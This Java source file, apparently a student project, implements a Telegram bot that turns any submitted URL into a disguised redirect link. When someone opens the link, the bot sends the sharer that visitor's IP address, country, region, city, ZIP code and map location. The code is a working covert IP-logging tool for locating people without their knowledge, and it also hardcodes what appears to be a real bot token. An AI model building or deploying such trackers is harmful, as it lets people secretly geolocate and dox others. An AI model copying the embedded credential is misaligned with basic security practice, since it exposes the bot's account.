package org.pdp.vpnapp.bot;

import lombok.SneakyThrows;
import org.pdp.vpnapp.model.Information;
import org.pdp.vpnapp.utils.IpAddressUtils;
import org.springframework.stereotype.Component;
import org.telegram.telegrambots.bots.TelegramLongPollingBot;
import org.telegram.telegrambots.meta.api.methods.send.SendLocation;
import org.telegram.telegrambots.meta.api.methods.send.SendMessage;
import org.telegram.telegrambots.meta.api.objects.Update;

@Component
public class TelegramBot extends TelegramLongPollingBot {
    private static final String URL = "http://localhost:8080/redirect/";
    private static final String BOT_TOKEN = "6674985300:AAFgJYmO42YggQBFBY1450zkkHmZj7QZGjM";
    private static final String USERNAME = "pdp_test_maker_bot";

    public TelegramBot() {
        super(BOT_TOKEN);
    }

    @Override
    @SneakyThrows
    public void onUpdateReceived(Update update) {
        if (update.hasMessage() && update.getMessage().hasText()) {
            String link = update.getMessage().getText();
            Long chatId = update.getMessage().getChatId();
            if (link.equals("/start"))
                execute(SendMessage.builder().text("Welcome to bot!\nPlease enter link").chatId(chatId).build());
            else if (!link.startsWith("http:") && !link.startsWith("https:"))
                execute(SendMessage.builder().text("Please enter valid link").chatId(chatId).build());
            else
                execute(SendMessage.builder().text(URL+ IpAddressUtils.generateLink(chatId,link)).chatId(chatId).build());
        }
    }
    @SneakyThrows
    public void sendData(Information information, Long chatId){
        String text = "\uD83D\uDD0F IP ADDRESS : " + information.getIp() + "\n" +
                "\uD83D\uDDFA COUNTRY NAME : " + information.getCountry_name() + "\n" +
                "®️ REGION NAME : " + information.getRegion_name() + "\n" +
                "\uD83C\uDFD9 CITY : " + information.getCity() + "\n" +
                "\uD83D\uDCE6 ZIP CODE : " + information.getZip();
        execute(SendMessage.builder()
                .text(text)
                .chatId(chatId)
                .build());
        execute(SendLocation.builder()
                .latitude(Double.parseDouble(information.getLatitude()))
                .longitude(Double.parseDouble(information.getLongitude()))
                .chatId(chatId)
                .build());
    }
    @Override
    public String getBotUsername() {
        return USERNAME;
    }
}
